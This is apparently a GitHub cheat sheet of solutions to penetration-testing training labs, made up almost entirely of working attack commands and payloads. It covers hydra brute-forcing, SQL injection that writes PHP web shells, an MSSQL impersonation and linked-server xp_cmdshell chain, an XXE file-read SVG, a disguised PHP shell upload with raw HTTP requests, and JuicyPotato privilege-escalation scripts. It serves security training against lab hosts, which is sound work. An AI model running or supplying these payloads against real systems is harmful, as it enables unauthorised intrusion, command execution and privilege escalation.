https://github.com/missteek/cpts-quick-references/blob/main/assessments/Password%20Attacks%20Lab%20-%20Hard.md

---
### Attacking Common Services:
---
#### Attacking Common Services - Easy:
```
UserEnum:       smtp-user-enum -M RCPT -U users.txt -D inlanefreight.htb -t $ip
PW Bruteforce:  hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt $ip smtp
Login MySQL:    mysql -h $ip -u <user> -p <password>
SQL RCE:        SELECT "<?php if(isset($_GET['cmd'])){ echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; } ?>" INTO OUTFILE 'C:/xampp/htdocs/cmd.php';
RCE:            curl http://$ip/cmd.php?cmd=whoami
```
#### Attacking Common Services - Medium:
```
nmap scan:      nmap $ip -p- --open -o nmap.txt | grep '/tcp' | cut -d'/' -f1 | paste -sd, -
ftp anonymous:  ftp $ip 30021
download file:  get mynotes.txt
PW Bruteforce:  hydra -l simon -P mynotes.txt $ip ssh OR hydra -l simon -P mynotes.txt $ip pop3
Login:          ssh simon@$ip
```

#### Attacking Common Services - Hard:
```
-- 1. Get the names of all databases in the SQL Server instance
SELECT name FROM master.dbo.sysdatabases;
GO

-- 2. Switch to the 'TestingDB' database for further queries
USE TestingDB;
GO

-- 3. Get all tables from the 'TestAppDB' database
SELECT table_name FROM TestAppDB.INFORMATION_SCHEMA.TABLES;
GO

-- 4. Find distinct names of principals who have the 'IMPERSONATE' permission
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
GO

-- 5. Execute as the 'john' login and check the current user and sysadmin membership
EXECUTE AS LOGIN = 'john';
SELECT SYSTEM_USER;  -- Get the current user
SELECT IS_SRVROLEMEMBER('sysadmin');  -- Check if the user is a sysadmin
GO

-- 6. Get information about linked servers and remote status
SELECT srvname, isremote FROM sys.servers;
GO

-- 7. Enable 'show advanced options' on the linked server
EXEC [LOCAL.TEST.LINKED.SRV].master.dbo.sp_configure 'show advanced options', 1;
GO

-- 8. Apply the configuration changes (RECONFIGURE)
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
GO

-- 9. Execute a query on the linked server to get server details and check sysadmin role
EXECUTE ('SELECT @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV];
GO

-- 10. Enable 'show advanced options' on the linked server using EXECUTE
EXECUTE ('EXEC sp_configure ''show advanced options'', 1;') AT [LOCAL.TEST.LINKED.SRV];
GO

-- 11. Apply the configuration (RECONFIGURE) on the linked server using EXECUTE
EXECUTE ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
GO

-- 12. Enable 'xp_cmdshell' on the linked server
EXECUTE ('EXEC sp_configure ''xp_cmdshell'', 1;') AT [LOCAL.TEST.LINKED.SRV];
GO

-- 13. Execute a command on the linked server using 'xp_cmdshell' to interact with the file system
EXECUTE ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt > C:\Users\fiona\Desktop\xc.txt''') AT [LOCAL.TEST.LINKED.SRV];
GO
```
---
### Attacking Web Applications with Ffuf:
---
#### Skills Assessment - Web Fuzzing:
```
Subdomain Fuzzing:            ffuf -u http://academy.htb:54143 -H "Host:FUZZ.academy.htb:54143" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 423
Extension Fuzzing:            ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:54143/indexFUZZ
Page Fuzzing:                 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt:FUZZ -u http://faculty.academy.htb:54143/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -fs 287
Parameter Fuzzing (POST):     ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:49893/courses/linux-security.php7 -X POST -d "FUZZ=key" -H "Content-Type: application/x-www-form-urlencoded" -fs 774
Value Fuzzing (POST):         ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://faculty.academy.htb:49893/courses/linux-security.php7 -X POST -d "username=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 781
     
```

---
### SQL Injection Fundamentals:
---
#### Skills Assessment :

#### For the login:
``` admin' or '1'='1'-- - ```
#### After the login (copy the the request from the browser as cURL):
``` sqlmap 'http://94.237.62 <SNIP> .php' -H 'Cookie: PHPSESSID=avgi9hf5r3hj0kfuh4573o7rr6' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'search=sdsdsds' --data 'search=*' --os-shell --batch ```

#### Alternative Solution:
```
' union select "",'<?php system(pwd); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell1.php'-- -
' union select "",'<?php system("dir /"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell2.php'-- -
' UNION SELECT 1,LOAD_FILE("/flag_cae1dadcd174.txt"),3,4,5-- -
```


---
### File Upload:
---
#### Skills Assessment :



```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

```
------WebKitFormBoundarys1yno5vqOsmwB8bV
Content-Disposition: form-data; name="uploadFile"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
------WebKitFormBoundarys1yno5vqOsmwB8bV--
```

```
<svg>
PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K
</svg>
```
```
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

```
echo -n -e '\xff\xd8\xff\xe0\x0d\x0a' > image.txt
```

```
POST /contact/upload.php HTTP/1.1
Host: 94.237.54.190:59897
Content-Length: 234
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarys1yno5vqOsmwB8bV
Origin: http://94.237.54.190:59897
Referer: http://94.237.54.190:59897/contact/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundarys1yno5vqOsmwB8bV
Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.jpeg"
Content-Type: image/jpg

ÿØÿà
<?php system($_GET['cmd']);?>
------WebKitFormBoundarys1yno5vqOsmwB8bV--
```

```
GET /contact/user_feedback_submissions/250216_shell.phar.jpeg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt HTTP/1.1
Host: 94.237.54.190:59897
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Origin: http://94.237.54.190:59897
Referer: http://94.237.54.190:59897/contact/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```
---
### Windows Priv Esc:
---
#### Skills Assessment :

```
@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN (CLSID.list) DO (
   echo %%i !port!
   juicypotato.exe -z -l !port! -c %%i >> result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if "!RET!" == "1"  set /a port=port+1
)
```


```
<#
This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
Then exports to CSV
#>

$ErrorActionPreference = "Stop"

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

Write-Output "Looking for CLSIDs"
$CLSID = @()
Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
    if ($ID.appid -ne $null){
        $CLSID += $ID
    }
}

Write-Output "Looking for APIDs"
$APPID = @()
Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
    if ($AID.LocalService -ne $null){
        $APPID += $AID
    }
}

Write-Output "Joining CLSIDs and APIDs"
$RESULT = @()
Foreach ($app in $APPID){
    Foreach ($CLS in $CLSID){
        if($CLS.AppId -eq $app.AppID){
            $RESULT += New-Object psobject -Property @{
                AppId    = $app.AppId
                LocalService = $app.LocalService
                CLSID = $CLS.CLSID
            }

            break
        }
    }
}

$RESULT = $RESULT | Sort-Object LocalService

# Preparing to Output
$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace "Microsoft ", ""
$TARGET = $OS -Replace " ","_"

# Make target folder
New-Item -ItemType Directory -Force -Path .\$TARGET

# Output in a CSV
$RESULT | Export-Csv -Path ".\$TARGET\CLSIDs.csv" -Encoding ascii -NoTypeInformation

# Export CLSIDs list
$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLSID.list" -Encoding ascii

# Visual Table
$RESULT | ogv
```
